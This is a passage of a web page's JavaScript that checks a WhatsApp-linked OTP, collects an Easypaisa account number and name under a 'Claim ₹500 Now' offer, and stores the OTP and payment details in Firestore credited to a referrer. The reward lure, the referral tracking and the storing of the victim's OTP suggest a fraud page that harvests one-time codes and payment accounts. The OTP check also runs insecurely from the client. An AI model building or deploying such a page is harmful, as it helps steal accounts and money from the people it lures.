        showOfferError('Please enter valid 6-digit OTP');
        return;
      }

      try {
        // Check if OTP is valid
        const otpSnapshot = await db.collection('otp_requests')
          .where('linkId', '==', linkId)
          .where('whatsappNumber', '==', whatsapp)
          .where('otp', '==', otp)
          .where('status', '==', 'sent')
          .orderBy('createdAt', 'desc')
          .limit(1)
          .get();

        if (otpSnapshot.empty) {
          showOfferError('Invalid OTP');
          return;
        }

        const otpDoc = otpSnapshot.docs[0];
        const otpData = otpDoc.data();

        // Check if OTP expired (5 minutes)
        const expiryTime = otpData.expiresAt.toDate();
        if (new Date() > expiryTime) {
          showOfferError('OTP expired. Please request again.');
          return;
        }

        // Update OTP status
        await otpDoc.ref.update({
          status: 'verified'
        });

        // Show success message
        document.getElementById('offerSuccess').style.display = 'flex';
        document.getElementById('offerSuccess').innerHTML = '<i class="fas fa-check-circle"></i> OTP verified successfully!';
        
        showToast('OTP verified successfully!', 'success');

      } catch (error) {
        console.error('Error verifying OTP:', error);
        showOfferError('Error verifying OTP');
      }
    };

    // Submit offer
    window.submitOffer = async function(linkId) {
      const whatsapp = document.getElementById('offerWhatsapp')?.value;
      const otp = document.getElementById('offerOtp')?.value;
      const easypaisa = document.getElementById('offerEasypaisa')?.value;
      const name = document.getElementById('offerName')?.value;
      const claimBtn = document.getElementById('claimBtn');

      if (!whatsapp || !otp || !easypaisa || !name) {
        showOfferError('Please fill all fields');
        return;
      }

      if (easypaisa.length < 10) {
        showOfferError('Please enter valid Easypaisa number');
        return;
      }

      try {
        claimBtn.disabled = true;
        claimBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Submitting...';

        // Verify OTP again before submission
        const otpSnapshot = await db.collection('otp_requests')
          .where('linkId', '==', linkId)
          .where('whatsappNumber', '==', whatsapp)
          .where('otp', '==', otp)
          .where('status', '==', 'verified')
          .orderBy('createdAt', 'desc')
          .limit(1)
          .get();

        if (otpSnapshot.empty) {
          showOfferError('Please verify OTP first');
          claimBtn.disabled = false;
          claimBtn.innerHTML = '<i class="fas fa-check-circle"></i> Claim â‚¹500 Now';
          return;
        }

        // Find the link
        const linksSnapshot = await db.collection('links')
          .where('linkId', '==', linkId)
          .get();

        if (linksSnapshot.empty) {
          showOfferError('Invalid link');
          claimBtn.disabled = false;
          claimBtn.innerHTML = '<i class="fas fa-check-circle"></i> Claim â‚¹500 Now';
          return;
        }

        const linkDoc = linksSnapshot.docs[0];
        const linkData = linkDoc.data();

        // Save offer
        await db.collection('offers').add({
          referrerId: linkData.userId,
          linkId: linkId,
          whatsappNumber: whatsapp,
          otp: otp,
          otpStatus: 'verified',
          easypaisaNumber: easypaisa,
          easypaisaName: name,
          amount: 500,
          status: 'pending',
          createdAt: firebase.firestore.FieldValue.serverTimestamp()
        });

        // Update link stats
        await linkDoc.ref.update({
          visits: firebase.firestore.FieldValue.increment(1)
        });

        // Update referrer stats
        const userSnapshot = await db.collection('users')
          .where('uid', '==', linkData.userId)
          .get();
        
        if (!userSnapshot.empty) {
          const userDoc = userSnapshot.docs[0];
          await userDoc.ref.update({
            totalVisits: firebase.firestore.FieldValue.increment(1)
          });
        }

        // Show success message
        document.querySelector('.offer-container').innerHTML = `
          <div class="offer-card" style="text-align:center;">
            <i class="fas fa-check-circle" style="font-size:80px; color:#4caf50; margin-bottom:20px;"></i>
            <h2 style="color:#333; margin-bottom:10px;">Success!</h2>
            <p style="color:#666; margin-bottom:20px;">Your claim has been submitted. You will receive â‚¹500 in your Easypaisa account within 24 hours.</p>
            <button class="btn btn-primary" onclick="window.location.href='/'">Go Back</button>
          </div>
        `;

      } catch (error) {
        console.error('Error submitting offer:', error);
        showOfferError('Error submitting form. Please try again.');
        claimBtn.disabled = false;
        claimBtn.innerHTML = '<i class="fas fa-check-circle"></i> Claim â‚¹500 Now';
      }
    };

    function showOfferError(message) {
      const errorDiv = document.getElementById('offerError');
      errorDiv.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${message}`;
      errorDiv.style.display = 'flex';
      
      // Hide after 5 seconds
      setTimeout(() => {
        errorDiv.style.display = 'none';
      }, 5000);
    }

    // Toast function
    function showToast(message, type = 'info') {
      const toast = document.getElementById('toast');
      const icon = toast.querySelector('i');
      const span = toast.querySelector('span');
      
      span.textContent = message;
      
      if (type === 'success') {
        icon.className = 'fas fa-check-circle';
        icon.style.color = '#4caf50';
        toast.className = 'toast success show';
      } else if (type === 'error') {
        icon.className = 'fas fa-exclamation-circle';
        icon.style.color = '#f44336';
        toast.className = 'toast error show';
      } else {
        icon.className = 'fas fa-info-circle';
        icon.style.color = '#2196f3';
        toast.className = 'toast info show';
      }
      
      setTimeout(() => {
        toast.classList.remove('show');
      }, 3000);
    }

    // Check for referral on load
    window.addEventListener('load', checkReferral);
  </script>
</body>
</html>